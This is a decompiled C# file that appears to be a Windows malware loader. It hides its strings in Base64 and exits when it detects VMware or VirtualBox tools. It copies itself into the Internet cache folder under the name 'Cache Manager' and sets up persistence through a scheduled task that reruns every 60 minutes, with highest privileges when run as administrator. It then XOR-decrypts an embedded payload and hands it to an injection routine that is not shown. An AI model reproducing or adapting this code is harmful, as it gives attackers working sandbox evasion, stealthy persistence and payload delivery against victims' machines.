using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal static class Class0
{
	public static FileInfo fileInfo_0 = new FileInfo(Encoding.UTF8.GetString(Convert.FromBase64String("Q2FjaGVNYW5hZ2VyLmV4ZS5leGU=")));

	public static DirectoryInfo directoryInfo_0 = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache), Encoding.UTF8.GetString(Convert.FromBase64String("Q2FjaGUgTWFuYWdlcg=="))));

	public static string string_0 = Encoding.UTF8.GetString(Convert.FromBase64String("SW50ZXJuZXRDYWNoZU1hbmFnZXIxLTExNzMz"));

	public static void Main()
	{
		if (smethod_3())
		{
			Environment.Exit(0);
		}
		smethod_4();
		byte[] byte_ = smethod_0(Encoding.UTF8.GetString(Convert.FromBase64String("UjVnNTlGTVNmSQ==")));
		byte[] byte_2 = smethod_1(byte_, Encoding.UTF8.GetString(Convert.FromBase64String("VzFybmVQMEY3Tg==")));
		GClass0.smethod_0(Application.get_ExecutablePath(), byte_2, bool_0: false);
	}

	public static byte[] smethod_0(string string_1)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		using Stream stream = executingAssembly.GetManifestResourceStream(string_1);
		if (stream == null)
		{
			return null;
		}
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		return array;
	}

	private static byte[] smethod_1(byte[] byte_0, string string_1)
	{
		return smethod_2(byte_0, string_1);
	}

	private static byte[] smethod_2(byte[] byte_0, string string_1)
	{
		byte[] array = new byte[byte_0.Length];
		for (int i = 0; i < byte_0.Length; i++)
		{
			array[i] = (byte)(byte_0[i] ^ string_1[i % string_1.Length]);
		}
		return array;
	}

	private static bool smethod_3()
	{
		bool result = false;
		List<string> list = new List<string>();
		list.Add(Encoding.UTF8.GetString(Convert.FromBase64String("Vm10b29sc2Q=")));
		list.Add(Encoding.UTF8.GetString(Convert.FromBase64String("dmJveHNlcnZpY2U=")));
		list.Add(Encoding.UTF8.GetString(Convert.FromBase64String("Vm13YXJldXNlcg==")));
		list.Add(Encoding.UTF8.GetString(Convert.FromBase64String("Vm13YXJldHJhdA==")));
		List<string> list2 = list;
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (list2.Contains(process.ProcessName))
			{
				result = true;
			}
		}
		return result;
	}

	public static void smethod_4()
	{
		if (!smethod_5())
		{
			try
			{
				smethod_6();
				smethod_7();
				smethod_9();
			}
			catch
			{
			}
		}
	}

	public static bool smethod_5()
	{
		if (Application.get_ExecutablePath() == Path.Combine(directoryInfo_0.FullName, fileInfo_0.Name))
		{
			return true;
		}
		return false;
	}

	public static void smethod_6()
	{
		if (!directoryInfo_0.Exists)
		{
			directoryInfo_0.Create();
		}
	}

	public static void smethod_7()
	{
		string text = Path.Combine(directoryInfo_0.FullName, fileInfo_0.Name);
		if (fileInfo_0.Exists)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.MainModule!.FileName == text)
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			File.Delete(text);
			Thread.Sleep(250);
		}
		using FileStream fileStream = new FileStream(text, FileMode.Create, FileAccess.Write);
		byte[] array = File.ReadAllBytes(Application.get_ExecutablePath());
		fileStream.Write(array, 0, array.Length);
	}

	public static bool smethod_8()
	{
		using WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(ntIdentity);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static void smethod_9()
	{
		try
		{
			if (smethod_8())
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo(Encoding.UTF8.GetString(Convert.FromBase64String("Y21k")), Encoding.UTF8.GetString(Convert.FromBase64String("L0Mgc2NodGFza3MgL2NyZWF0ZSAvdG4gXA==")) + string_0 + Encoding.UTF8.GetString(Convert.FromBase64String("IC90ciAi")) + Path.Combine(directoryInfo_0.FullName, fileInfo_0.Name) + Encoding.UTF8.GetString(Convert.FromBase64String("IiAvc3QgMDA6MDAgL2R1IDk5OTk6NTkgL3NjIG9uY2UgL3JpIDYwIC9ybCBISUdIRVNUIC9m")));
				Process process2 = process;
				process2.StartInfo.CreateNoWindow = true;
				process2.StartInfo.RedirectStandardError = true;
				process2.StartInfo.RedirectStandardOutput = true;
				process2.StartInfo.UseShellExecute = false;
				process2.Start();
			}
			else
			{
				Process process3 = new Process();
				process3.StartInfo = new ProcessStartInfo(Encoding.UTF8.GetString(Convert.FromBase64String("Y21k")), Encoding.UTF8.GetString(Convert.FromBase64String("L0Mgc2NodGFza3MgL2NyZWF0ZSAvdG4gXA==")) + string_0 + Encoding.UTF8.GetString(Convert.FromBase64String("IC90ciAi")) + Path.Combine(directoryInfo_0.FullName, fileInfo_0.Name) + Encoding.UTF8.GetString(Convert.FromBase64String("IiAvc3QgMDA6MDAgL2R1IDk5OTk6NTkgL3NjIG9uY2UgL3JpIDYwIC9m")));
				Process process2 = process3;
				process2.StartInfo.CreateNoWindow = true;
				process2.StartInfo.RedirectStandardError = true;
				process2.StartInfo.RedirectStandardOutput = true;
				process2.StartInfo.UseShellExecute = false;
				process2.Start();
			}
		}
		catch
		{
		}
	}
}
